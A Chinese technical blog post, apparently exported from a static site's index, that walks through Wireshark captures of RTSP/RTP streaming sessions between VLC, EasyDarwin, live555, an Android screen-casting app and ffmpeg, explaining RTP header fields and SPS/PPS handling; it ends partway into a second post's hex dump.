序列号(SN)：16Bit，发送方在每发送完一个RTP包后就将该域的值增加1，可以由该域检测包的丢失及恢复包的序列。序列号的初始值是随机的。 时间戳timestamp：32比特，记录了该包中数据的第一个字节的采样时刻 同步源标识符(SSRC)：32比特，同步源就是RTP包源的来源。在同一个RTP会话中不能有两个相同的SSRC值 贡献源列表(CSRC List)：0-15项，每项32比特，这个不常用，可以不用。 0x80 是指二进制位的值（10000000） 123410.. .... = Version: RFC 1889 Version (2)..0. .... = Padding: False...0 .... = Extension: False.... 0000 = Contributing source identifiers count: 0 0x60 120... .... = Marker: FalsePayload type: DynamicRTP-Type-96 (96) 0x4475 1Sequence number: 17525 0x00bd1410 1Timestamp: 12391440 0x2e9f0a40 1Synchronization Source identifier: 0x2e9f0a40 (782174784) 头部后面的就是payload负载了。 SDP在RTSP的DESCRIBE方法响应 SDP Body 中，这一行很重要，下面分析一下。 1a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==; fmtp:96 其中 96 表示视频格式是H.264sprop-parameter-sets 则是H.264中比较重要的SPS和PPS信息，它的值是两个Base64编码的值（逗号隔开），Z0LAHtoHgUSAeEAhUA -&gt; 0x6742c01eda0781448078402150 ，0x67 表示这是SPS。aM48gA== -&gt; 0x68ce3c80 ，0x68表示这是PPS 。 二、Play 抓包 Over UDP 推流client端rtmp-rtsp-stream-client-java server端EasyDarwin 播放client端VLC（ 这里用Wireshark抓包 ） tcp追踪流（RTSP部分，rtp over udp） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465OPTIONS rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 2User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)RTSP/1.0 200 OKCSeq: 2Session: Ub5j54nMRPublic: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORDDESCRIBE rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 3User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Accept: application/sdpRTSP/1.0 200 OKCSeq: 3Session: Ub5j54nMRContent-Length: 444v=0o=- 0 0 IN IP4 127.0.0.1s=Unnamedi=N/Ac=IN IP4 192.168.0.223t=0 0a=recvonlym=video 0 RTP/AVP 96a=rtpmap:96 H264/90000a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==;a=control:trackID=1m=audio 0 RTP/AVP 96a=rtpmap:96 MPEG4-GENERIC/32000/2a=fmtp:96 streamtype=5; profile-level-id=15; mode=AAC-hbr; config=1290; SizeLength=13; IndexLength=3; IndexDeltaLength=3;a=control:trackID=0SETUP rtsp://192.168.0.223:554/test/trackID=1 RTSP/1.0CSeq: 4User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Transport: RTP/AVP;unicast;client_port=49834-49835RTSP/1.0 200 OKCSeq: 4Session: Ub5j54nMRTransport: RTP/AVP;unicast;client_port=49834-49835SETUP rtsp://192.168.0.223:554/test/trackID=0 RTSP/1.0CSeq: 5User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Transport: RTP/AVP;unicast;client_port=49836-49837Session: Ub5j54nMRRTSP/1.0 200 OKCSeq: 5Session: Ub5j54nMRTransport: RTP/AVP;unicast;client_port=49836-49837PLAY rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 6User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Session: Ub5j54nMRRange: npt=0.000-RTSP/1.0 200 OKCSeq: 6Session: Ub5j54nMRRange: npt=0.000- rtp over udp 12345678910111213Real-Time Transport Protocol [Stream setup by RTSP (frame 13)] 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 0... .... = Marker: False Payload type: DynamicRTP-Type-96 (96) Sequence number: 918 [Extended sequence number: 66454] Timestamp: 849582 Synchronization Source identifier: 0x0ce9d37f (216650623) Payload: 7c85b8141ff1c6921a6ba385c00040056dd92a7ccbeb7e38… 十六进制 （0x80600396000cf6ae0ce9d37f 是 rtp header） 180600396000cf6ae0ce9d37f|我是分隔符|7c85b8141ff1c6921a6ba385c00040056dd92a7ccbeb7e38000837470001067fff1fc3177b46c9c731d84f1e6b6f6ff6fc763b09e21dfe9df6dbc8b84f176dbfe9db4d3b68efff8f1c444b8fca76b5da32e13cda7476ffff477fc47e3c53ebad78fc20f47edf6fe3ffa3fffff3ff043afe1edee6b04a600b730c899d05e4d4dffba8ba5f3adab44c59e08ded760e63763eda138901d3c527ffedff09e0854eb3b7ffe3bef09fd013dfb7ffe9be1d7a32430a449f19848276060df0f31fe941ff8a8976a7039b22b8d910300043c1c004254905641cf077c3c9ed77812f89043040be9a437b35b520bf448436f46f48c000401817b8f391571dc96f9f8515c3225034d14963b27feab77e6a3e8e7722e93bf6bda10b439fbee0f8afa2887e21c776f75fb8c50fff9f50caa27ddf2f17de9e690f29a9780eef43e6b031805184fce2e27feb480fb577381cace9e2bbaf378354bd524c3a3c45812dc55528ee47b8a78ab2f228bddf5372c7964bd0781f5cb673f2dbd45cfe8fc00e8675e64aaca76d34cdbaa6993c69c69c5df77bb0cf48a7ba41457cb8f6d42728128ecd69f2d1b7fdbffc89e3ebe78cbbe90bb557dc8fa006e3e8593fb7f5d3b65a8347e7ffd757e21558f4b17ac009c887912807061fdc1d87e56cfffcd951823d6e8d28060f7038a1605115c154bc0bcec0e77cfbc17ae34e6cf9b2b7641dd1f4e3e5dfff0f060a7bf595121372efffdbd2de14a9c908826749655109894930c25b0cb20fc30327a7ffc2b8973fff6e54b221f641354a50ffffe8e7485551a7fffca8c832481117a78fffdb6d05fd3edf171153a44cb24d580c9862259a3152f54e1565d4694eda2a32519e5ffbbfa88afe7cd956bd2f516f74fffa21042c4e12421c2112488a2a11b4da4055a564a7b022561f103175bd441f8f73fc3d4474f8e62d71bc4c1dc6c6cd295df1690870f73aa0efad48c09f7ec5203c0954554ba7f0a312006e3bd03fbacf6ff9518c1ed5bccb3c49106c150b6bc14c5216e9ab42bfb48cb8d958eb59641482a2946928541f04f49fd74e3b4ea8e67b78147940b2d3813f275f5744028cad6a0d27369bd6b8e6ddf4ae5ea34ac977795b69afa9888a2dc7c657b8428e7f510f971c3d035d0ee31ee67a6185555ceb6610c896d16c32cd8c857bedf56aaf58a49a1e68f28875bedf4bd083601f0ada56fffffe7d61d07fd650b7e045246963c6aa9d28ed1ccf9e37c584401664a2f8e92c711f055b7b52d9d89dc02f7e48280553ca1c2d52cf20159a824cb6fb7eb60971384a9ff7b954807714fcb880952c102ed4fd32af30ce6032668ad447dfae2425f10c04dfcfea34116c1565385b99728679581c8d23dbb18bdf90abeae6fbfa94ca18f486feb34d660bec5c5d76b54db986731a0857db65250c82d293b16060802c1c1037464d9b3709ecf5b770ca586800821738c93c4588a64b80d33292b3ec07c461c7e840bda57c18f4403615df6de9012a2b60b7e066105e60f30aee1506dbc2c4f2b8c89201b293a8fa61dd3d3804498c8c48643c80724573fb77238f65116824d336be409c8ec6a290344368394a6bd00a5872d4107ff54b09eb398c061f5e0c81283da0afdbf06686a383fab987254b835d095f2cabcbe0eaae9c4c03d7286ada203e607156d0d3a9b6f9f9a0034211effb7c0392a47214afbef9ffda37102e821292af133105d4c33b5ddbf0b1ba4e609422f878e94831e6f6909391292a41daafd076146581226a148afcfa1395062fa8 后面 rtp payload 是H264的NAL，这部分可能有三种情况：单NAL，聚合NAL，分包NAL 三、Play 抓包 Over UDP server端live555 播放client端VLC（ 这里用Wireshark抓包 ） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798OPTIONS rtsp://192.168.0.226:8554/test81.mkv RTSP/1.0CSeq: 2User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)RTSP/1.0 200 OKCSeq: 2Date: Sat, Aug 01 2020 08:49:00 GMTPublic: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, GET_PARAMETER, SET_PARAMETERDESCRIBE rtsp://192.168.0.226:8554/test81.mkv RTSP/1.0CSeq: 3User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Accept: application/sdpRTSP/1.0 200 OKCSeq: 3Date: Sat, Aug 01 2020 08:49:00 GMTContent-Base: rtsp://192.168.0.226:8554/test81.mkv/Content-Type: application/sdpContent-Length: 802v=0o=- 1596271740645123 1 IN IP4 192.168.0.226s=Matroska video+audio+(optional)subtitles, streamed by the LIVE555 Media Serveri=test81.mkvt=0 0a=tool:LIVE555 Streaming Media v2020.07.31a=type:broadcasta=control:*a=range:npt=0-24.762a=x-qt-text-nam:Matroska video+audio+(optional)subtitles, streamed by the LIVE555 Media Servera=x-qt-text-inf:test81.mkvm=video 0 RTP/AVP 96c=IN IP4 0.0.0.0b=AS:500a=rtpmap:96 H264/90000a=fmtp:96 packetization-mode=1;profile-level-id=64001F;sprop-parameter-sets=Z2QAH6zZQIgeaEAAAAMAQAAADIPGDGWA,aO+8sA==a=control:track1m=audio 0 RTP/AVP 97c=IN IP4 0.0.0.0b=AS:96a=rtpmap:97 MPEG4-GENERIC/44100/2a=fmtp:97 streamtype=5;profile-level-id=1;mode=AAC-hbr;sizelength=13;indexlength=3;indexdeltalength=3;config=1210a=control:track2SETUP rtsp://192.168.0.226:8554/test81.mkv/track1 RTSP/1.0CSeq: 4User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Transport: RTP/AVP;unicast;client_port=53828-53829RTSP/1.0 200 OKCSeq: 4Date: Sat, Aug 01 2020 08:49:00 GMTTransport: RTP/AVP;unicast;destination=192.168.0.30;source=192.168.0.226;client_port=53828-53829;server_port=6970-6971Session: 19482B64;timeout=65SETUP rtsp://192.168.0.226:8554/test81.mkv/track2 RTSP/1.0CSeq: 5User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Transport: RTP/AVP;unicast;client_port=53830-53831Session: 19482B64RTSP/1.0 200 OKCSeq: 5Date: Sat, Aug 01 2020 08:49:00 GMTTransport: RTP/AVP;unicast;destination=192.168.0.30;source=192.168.0.226;client_port=53830-53831;server_port=6972-6973Session: 19482B64;timeout=65PLAY rtsp://192.168.0.226:8554/test81.mkv/ RTSP/1.0CSeq: 6User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Session: 19482B64Range: npt=0.000-RTSP/1.0 200 OKCSeq: 6Date: Sat, Aug 01 2020 08:49:00 GMTRange: npt=0.000-Session: 19482B64RTP-Info: url=rtsp://192.168.0.226:8554/test81.mkv/track1;seq=51716;rtptime=3858412142,url=rtsp://192.168.0.226:8554/test81.mkv/track2;seq=33672;rtptime=3712761154PAUSE rtsp://192.168.0.226:8554/test81.mkv/ RTSP/1.0CSeq: 7User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Session: 19482B64RTSP/1.0 200 OKCSeq: 7Date: Sat, Aug 01 2020 08:49:04 GMTSession: 19482B64TEARDOWN rtsp://192.168.0.226:8554/test81.mkv/ RTSP/1.0CSeq: 8User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Session: 19482B64RTSP/1.0 200 OKCSeq: 8Date: Sat, Aug 01 2020 08:49:09 GMT 四、Play 抓包 Over UDP server端Android Show 播放client端VLC（ 这里用Wireshark抓包 ） 这一次抓包没有按照RTSP规范来，先启动了”Android Show”（开始发RTP包了），后启动VLC。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758OPTIONS rtsp://192.168.0.32:8554/ RTSP/1.0CSeq: 2User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)RTSP/1.0 200 OKServer: MajorKernelPanic RTSP ServerCseq: 2Content-Length: 0Public: DESCRIBE,SETUP,TEARDOWN,PLAY,PAUSEDESCRIBE rtsp://192.168.0.32:8554/ RTSP/1.0CSeq: 3User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Accept: application/sdpRTSP/1.0 200 OKServer: MajorKernelPanic RTSP ServerCseq: 3Content-Length: 240Content-Base: 192.168.0.32:8554/Content-Type: application/sdpv=0o=- 0 0 IN IP4 192.168.0.32s=Unnamedi=N/Ac=IN IP4 192.168.0.30t=0 0a=recvonlym=video 0 RTP/AVP 96a=rtpmap:96 H264/90000a=fmtp:96 packetization-mode=1;profile-level-id=000042;sprop-parameter-sets=;a=control:trackID=1SETUP 192.168.0.32:8554/trackID=1 RTSP/1.0CSeq: 4User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Transport: RTP/AVP;unicast;client_port=53754-53755RTSP/1.0 200 OKServer: MajorKernelPanic RTSP ServerCseq: 4Content-Length: 0Transport: RTP/AVP/UDP;unicast;destination=192.168.0.30;client_port=53754-53755;server_port=47390-45114;ssrc=d59b4263;mode=playSession: 1185d20035702caCache-Control: no-cachePLAY 192.168.0.32:8554/ RTSP/1.0CSeq: 5User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)Session: 1185d20035702caRange: npt=0.000-RTSP/1.0 200 OKServer: MajorKernelPanic RTSP ServerCseq: 5Content-Length: 0RTP-Info: url=rtsp://192.168.0.32:8554/trackID=1;seq=0Session: 1185d20035702ca 第一个Rtp包1234567891011121314151617Frame 1011: 86 bytes on wire (688 bits), 86 bytes captured (688 bits) on interface \\Device\\NPF_&#123;CAE75AB8-102D-4211-B413-07C344B1BD41&#125;, id 0Ethernet II, Src: HuaweiTe_cc:b7:c3 (ac:e3:42:cc:b7:c3), Dst: IntelCor_1c:fb:29 (70:1c:e7:1c:fb:29)Internet Protocol Version 4, Src: 192.168.0.32, Dst: 192.168.0.30User Datagram Protocol, Src Port: 47390, Dst Port: 53754Real-Time Transport Protocol [Stream setup by RTSP (frame 1009)] 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 1... .... = Marker: True Payload type: DynamicRTP-Type-96 (96) Sequence number: 32 [Extended sequence number: 65568] Timestamp: 688259944 Synchronization Source identifier: 0xd59b4263 (3583722083) Payload: 0000000161edab0df03a7126d03a00f27425901cfd5be89afa597d5afab10019 第二个Rtp包(空payload？)12345678910111213141516Frame 1012: 54 bytes on wire (432 bits), 54 bytes captured (432 bits) on interface \\Device\\NPF_&#123;CAE75AB8-102D-4211-B413-07C344B1BD41&#125;, id 0Ethernet II, Src: HuaweiTe_cc:b7:c3 (ac:e3:42:cc:b7:c3), Dst: IntelCor_1c:fb:29 (70:1c:e7:1c:fb:29)Internet Protocol Version 4, Src: 192.168.0.32, Dst: 192.168.0.30User Datagram Protocol, Src Port: 47390, Dst Port: 53754Real-Time Transport Protocol [Stream setup by RTSP (frame 1009)] 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 1... .... = Marker: True Payload type: DynamicRTP-Type-96 (96) Sequence number: 33 [Extended sequence number: 65569] Timestamp: 688259944 Synchronization Source identifier: 0xd59b4263 (3583722083) 第三个Rtp包1234567891011121314151617Frame 1013: 80 bytes on wire (640 bits), 80 bytes captured (640 bits) on interface \\Device\\NPF_&#123;CAE75AB8-102D-4211-B413-07C344B1BD41&#125;, id 0Ethernet II, Src: HuaweiTe_cc:b7:c3 (ac:e3:42:cc:b7:c3), Dst: IntelCor_1c:fb:29 (70:1c:e7:1c:fb:29)Internet Protocol Version 4, Src: 192.168.0.32, Dst: 192.168.0.30User Datagram Protocol, Src Port: 47390, Dst Port: 53754Real-Time Transport Protocol [Stream setup by RTSP (frame 1009)] 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 1... .... = Marker: True Payload type: DynamicRTP-Type-96 (96) Sequence number: 34 [Extended sequence number: 65570] Timestamp: 688261409 Synchronization Source identifier: 0xd59b4263 (3583722083) Payload: 0000000161efab0df03c74d901cfd5be89afa597d5afab100195 这几个都是P帧，原因是：AndroidShow启动投屏之后，就一开始发UDP包了，所以VLC连接上之后，接收到的第一帧不是I帧。 所以要等到接收到下一个I帧才能正常播放 但是这里有一个疑惑，Sdp中 “sprop-parameter-sets” 为空，Wireshark也显示Sdp这里出现错误，那VLC如何获取到SPS+PPS？ 注：VLC能正常播放和识别宽高 通过查看AndroidShow的源码，它是将 SPS+PPS 添加到流里面，每3秒就随rtp一起发送，所以不需要在SDP中携带SPS也能解码：1234567891011121314151617181920212223// Every 3 secondes, we send two packets containing NALU type 7 (sps) and 8 (pps)// 每3秒，我们发送两个包，包含NALU类型7 (sps)和8 (pps)// Those should allow the H264 stream to be decoded even if no SDP was sent to the decoder.// 即使没有SDP发送到解码器，H264流也允许被解码。delta2 += duration/1000000;if (delta2&gt;2000) &#123; delta2 = 0; if (sps != null) &#123; buffer = socket.requestBuffer(); socket.markNextPacket(); socket.updateTimestamp(ts); System.arraycopy(sps, 0, buffer, rtphl, sps.length); super.send(rtphl+sps.length); &#125; if (pps != null) &#123; buffer = socket.requestBuffer(); socket.updateTimestamp(ts); socket.markNextPacket(); System.arraycopy(pps, 0, buffer, rtphl, pps.length); super.send(rtphl+pps.length); &#125; &#125; 其中，super.send是发送rtcp的：1234/** Updates data for RTCP SR and sends the packet. */protected void send(int length) throws IOException &#123; socket.commitBuffer(length);&#125; 五、Record 抓包 Over TCP 在rtsp的方法中record是指client推流早期不太清楚，其实用ffmpeg作为推流客户端更好（标准） 推流client端 rtmp-rtsp-stream-client-java 默认推流 （ 这里用Wireshark抓包 ） server端EasyDarwin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960OPTIONS rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 1RTSP/1.0 200 OKCSeq: 1Session: 0sSc8K7MgPublic: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORDANNOUNCE rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 2Content-Length: 444Content-Type: application/sdpv=0o=- 0 0 IN IP4 127.0.0.1s=Unnamedi=N/Ac=IN IP4 192.168.0.223t=0 0a=recvonlym=video 0 RTP/AVP 96a=rtpmap:96 H264/90000a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==;a=control:trackID=1m=audio 0 RTP/AVP 96a=rtpmap:96 MPEG4-GENERIC/32000/2a=fmtp:96 streamtype=5; profile-level-id=15; mode=AAC-hbr; config=1290; SizeLength=13; IndexLength=3; IndexDeltaLength=3;a=control:trackID=0RTSP/1.0 200 OKCSeq: 2Session: 0sSc8K7MgSETUP rtsp://192.168.0.223:554/test//trackID=0 RTSP/1.0Transport: RTP/AVP/TCP;interleaved=0-1;mode=recordCSeq: 3Session: 0sSc8K7MgRTSP/1.0 200 OKCSeq: 3Session: 0sSc8K7MgTransport: RTP/AVP/TCP;interleaved=0-1;mode=recordSETUP rtsp://192.168.0.223:554/test//trackID=1 RTSP/1.0Transport: RTP/AVP/TCP;interleaved=2-3;mode=recordCSeq: 4Session: 0sSc8K7MgRTSP/1.0 200 OKCSeq: 4Session: 0sSc8K7MgTransport: RTP/AVP/TCP;interleaved=2-3;mode=recordRECORD rtsp://192.168.0.223:554/test/ RTSP/1.0Range: npt=0.000-CSeq: 5Session: 0sSc8K7MgRTSP/1.0 200 OKCSeq: 5Session: 0sSc8K7Mg rtp over tcp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293RTSP Interleaved Frame, Channel: 0x00, 284 bytes Magic: 0x24 Channel: 0x00 Length: 284Real-Time Transport Protocol 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 1... .... = Marker: True Payload type: DynamicRTP-Type-96 (96) Sequence number: 1 Timestamp: 31752 Synchronization Source identifier: 0x4ead93aa (1319998378) Payload: 00100860211c0fd3f7b904100cd41d9a87d188f484100ea0…RTSP Interleaved Frame, Channel: 0x01, 28 bytes Magic: 0x24 Channel: 0x01 Length: 28Real-time Transport Control Protocol (Sender Report) 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 0000 = Reception report count: 0 Packet type: Sender Report (200) Length: 6 (28 bytes) Sender SSRC: 0x1335186a (322246762) Timestamp, MSW: 29536 (0x00007360) Timestamp, LSW: 3497974249 (0xd07ed9e9) [MSW and LSW as NTP timestamp: Feb 7, 2036 14:40:32.814435595 UTC] RTP timestamp: 992265000 Sender's packet count: 1 Sender's octet count: 284 [RTCP frame length check: OK - 28 bytes]RTSP Interleaved Frame, Channel: 0x00, 288 bytes Magic: 0x24 Channel: 0x00 Length: 288Real-Time Transport Protocol 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 1... .... = Marker: True Payload type: DynamicRTP-Type-96 (96) Sequence number: 2 Timestamp: 33004 Synchronization Source identifier: 0x4ead93aa (1319998378) Payload: 00100880211c0feb7e2005013ccc4515a510e8443a710e88…RTSP Interleaved Frame, Channel: 0x00, 297 bytes Magic: 0x24 Channel: 0x00 Length: 297Real-Time Transport Protocol 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 1... .... = Marker: True Payload type: DynamicRTP-Type-96 (96) Sequence number: 3 Timestamp: 33515 Synchronization Source identifier: 0x4ead93aa (1319998378) Payload: 001008c8211c09bffe4800621cd41d928bd10874c22d1907…RTSP Interleaved Frame, Channel: 0x00, 248 bytes Magic: 0x24 Channel: 0x00 Length: 248Real-Time Transport Protocol 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 1... .... = Marker: True Payload type: DynamicRTP-Type-96 (96) Sequence number: 4 Timestamp: 34804 Synchronization Source identifier: 0x4ead93aa (1319998378) Payload: 00100740211c0f6d4c8000fffcdb348a29d108f462802b9d…RTSP Interleaved Frame, Channel: 0x00, 257 bytes Magic: 0x24 Channel: 0x00 Length: 257Real-Time Transport Protocol 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 1... .... = Marker: True Payload type: DynamicRTP-Type-96 (96) Sequence number: 5 Timestamp: 36157 Synchronization Source identifier: 0x4ead93aa (1319998378) Payload: 00100788211c0fa51e28016f3cdb30dfa316019b72bf3373… 六、Record 抓包 Over UDP 推流client端 rtmp-rtsp-stream-client-java 选用UDP推流 （ 这里用Wireshark抓包 ） server端EasyDarwin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768OPTIONS rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 1RTSP/1.0 200 OKCSeq: 1Session: 6KgD6pnGgPublic: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORDANNOUNCE rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 2Content-Length: 444Content-Type: application/sdpv=0o=- 0 0 IN IP4 127.0.0.1s=Unnamedi=N/Ac=IN IP4 192.168.0.223t=0 0a=recvonlym=video 0 RTP/AVP 96a=rtpmap:96 H264/90000a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAKNoBEA8WXgHhAIVA,aM48gA==;a=control:trackID=1m=audio 0 RTP/AVP 96a=rtpmap:96 MPEG4-GENERIC/44100/2a=fmtp:96 streamtype=5; profile-level-id=15; mode=AAC-hbr; config=1210; SizeLength=13; IndexLength=3; IndexDeltaLength=3;a=control:trackID=0RTSP/1.0 200 OKCSeq: 2Session: 6KgD6pnGgSETUP rtsp://192.168.0.223:554/test//trackID=0 RTSP/1.0Transport: RTP/AVP/UDP;unicast;client_port=5000-5001;mode=recordCSeq: 3Session: 6KgD6pnGgRTSP/1.0 200 OKCSeq: 3Session: 6KgD6pnGgTransport: RTP/AVP/UDP;unicast;client_port=5000-5001;server_port=53646-50516;mode=recordSETUP rtsp://192.168.0.223:554/test//trackID=1 RTSP/1.0Transport: RTP/AVP/UDP;unicast;client_port=5002-5003;mode=recordCSeq: 4Session: 6KgD6pnGgRTSP/1.0 200 OKSession: 6KgD6pnGgTransport: RTP/AVP/UDP;unicast;client_port=5002-5003;server_port=50593-32937;mode=recordCSeq: 4RECORD rtsp://192.168.0.223:554/test/ RTSP/1.0Range: npt=0.000-CSeq: 5Session: 6KgD6pnGgRTSP/1.0 200 OKCSeq: 5Session: 6KgD6pnGgTEARDOWN rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 6Session: 6KgD6pnGgRTSP/1.0 200 OKCSeq: 6Session: 6KgD6pnGg rtp over udp 123456789101112User Datagram Protocol, Src Port: 62235, Dst Port: 50593Real-Time Transport Protocol 10.. .... = Version: RFC 1889 Version (2) ..0. .... = Padding: False ...0 .... = Extension: False .... 0000 = Contributing source identifiers count: 0 0... .... = Marker: False Payload type: DynamicRTP-Type-96 (96) Sequence number: 2 Timestamp: 254255 Synchronization Source identifier: 0x401fd7b1 (1075828657) Payload: 7c85b82057ffffc2e2450001014fd63fde278f9369f7bbe4… 七、Record 抓包 Over UDP (FFmpeg) 推流FFmpeg(ffmpeg -re -i move.mp4 -vcodec copy -codec copy -f rtsp rtsp://192.168.0.30/live) server端 基于Netty写的接收程序（ 这里用Wireshark抓包 ） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778OPTIONS rtsp://192.168.0.30:554/live RTSP/1.0CSeq: 1User-Agent: Lavf57.71.100RTSP/1.0 200 OKpublic: OPTIONS, ANNOUNCE, SETUP, RECORD, TEARDOWNcseq: 1SESSION: 850601d9connection: keep-aliveANNOUNCE rtsp://192.168.0.30:554/live RTSP/1.0Content-Type: application/sdpCSeq: 2User-Agent: Lavf57.71.100Session: 850601d9Content-Length: 494v=0o=- 0 0 IN IP4 127.0.0.1s=No Namec=IN IP4 192.168.0.30t=0 0a=tool:libavformat 57.71.100m=video 0 RTP/AVP 96b=AS:1351a=rtpmap:96 H264/90000a=fmtp:96 packetization-mode=1; sprop-parameter-sets=Z2QAIKzZgIgee+EAAAMD6QAB1MAPGDGa,aOl4ssiw; profile-level-id=640020a=control:streamid=0m=audio 0 RTP/AVP 97b=AS:128a=rtpmap:97 MPEG4-GENERIC/44100/2a=fmtp:97 profile-level-id=1;mode=AAC-hbr;sizelength=13;indexlength=3;indexdeltalength=3; config=1210a=control:streamid=1RTSP/1.0 200 OKcseq: 2SESSION: 850601d9connection: keep-aliveSETUP rtsp://192.168.0.30:554/live/streamid=0 RTSP/1.0Transport: RTP/AVP/UDP;unicast;client_port=20502-20503;mode=recordCSeq: 3User-Agent: Lavf57.71.100Session: 850601d9RTSP/1.0 200 OKtransport: RTP/AVP/UDP;unicast;client_port=20502-20503;mode=record;server_port=54000-54001;ssrc=1015232941cseq: 3SESSION: 850601d9connection: keep-aliveSETUP rtsp://192.168.0.30:554/live/streamid=1 RTSP/1.0Transport: RTP/AVP/UDP;unicast;client_port=20504-20505;mode=recordCSeq: 4User-Agent: Lavf57.71.100Session: 850601d9RTSP/1.0 200 OKtransport: RTP/AVP/UDP;unicast;client_port=20504-20505;mode=record;server_port=54000-54001;ssrc=102410565cseq: 4SESSION: 850601d9connection: keep-aliveRECORD rtsp://192.168.0.30:554/live RTSP/1.0Range: npt=0.000-CSeq: 5User-Agent: Lavf57.71.100Session: 850601d9RTSP/1.0 200 OKfilename: 1595477112cseq: 5SESSION: 850601d9connection: keep-aliveTEARDOWN rtsp://192.168.0.30:554/live RTSP/1.0CSeq: 6User-Agent: Lavf57.71.100Session: 850601d9","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"RTP网络抓包分析","slug":"音视频/RTP网络抓包分析","date":"2020-07-16T11:52:36.000Z","updated":"2021-12-28T03:24:10.315Z","comments":true,"path":"音视频/RTP网络抓包分析/","link":"","permalink":"http://yoursite.com/音视频/RTP网络抓包分析/","excerpt":"","text":"RTP Over UDP这是rtmp-rtsp-stream-client-java发出的包180600396000cf6ae0ce9d37f|我是分隔符|7c85b8141ff1c6921a6ba385c00040056dd92a7ccbeb7e38000837470001067fff1fc3177b46c9c731d84f1e6b6f6ff6fc763b09e21dfe9df6dbc8b84f176dbfe9db4d3b68efff8f1c444b8fca76b5da32e13cda7476ffff477fc47e3c53ebad78fc20f47edf6fe3ffa3fffff3ff043afe1edee6b04a600b730c899d05e4d4dffba8ba5f3adab44c59e08ded760e63763eda138901d3c527ffedff09e0854eb3b7ffe3bef09fd013dfb7ffe9be1d7a32430a449f19848276060df0f31fe941ff8a8976a7039b22b8d910300043c1c004254905641cf077c3c9ed77812f89043040be9a437b35b520bf448436f46f48c000401817b8f391571dc96f9f8515c3225034d14963b27feab77e6a3e8e7722e93bf6bda10b439fbee0f8afa2887e21c776f75fb8c50fff9f50caa27ddf2f17de9e690f29a9780eef43e6b031805184fce2e27feb480fb577381cace9e2bbaf378354bd524c3a3c45812dc55528ee47b8a78ab2f228bddf5372c7964bd0781f5cb673f2dbd45cfe8fc00e8675e64aaca76d34cdbaa6993c69c69c5df77bb0cf48a7ba41457cb8f6d42728128ecd69f2d1b7fdbffc89e3ebe78cbbe90bb557dc8fa006e3e8593fb7f5d3b65a8347e7ffd757e21558f4b17ac009c887912807061fdc1d87e56cfffcd951823d6e8d2806